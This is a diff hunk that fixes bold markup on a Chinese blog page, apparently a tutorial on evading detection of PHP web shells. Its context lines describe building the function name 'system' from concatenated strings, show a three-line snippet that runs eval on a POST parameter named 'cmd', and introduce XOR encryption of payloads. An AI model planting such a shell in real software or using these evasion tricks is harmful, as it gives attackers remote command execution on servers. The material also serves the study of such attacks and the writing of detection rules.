@@ -641,7 +641,7 @@
 <p>这样会拼接成ab。那可以使用该方法对敏感函数拼接起来</p>
 <p>‘s’.’y’.’s’.’t’.’e’.’m’</p>
 <p>其他语言则可以用+号拼接</p>
-<p>通过拼接，去完善**$_POST<strong>或</strong>$_GET**传参</p>
+<p>通过拼接，去完善 <strong>$_POST</strong> 或 <strong>$_GET</strong> 传参</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">eval</span>;</span><br><span class="line"><span class="variable">$b</span>(<span class="variable">$a</span>); <span class="comment">#    =&gt; eval($_POST[&#x27;cmd&#x27;])</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="3、异或法"><a href="#3、异或法" class="headerlink" title="3、异或法"></a>3、异或法</h3><p>异或也就是使用xor加密函数，对payload进行一个异或的操作实现加密</p>
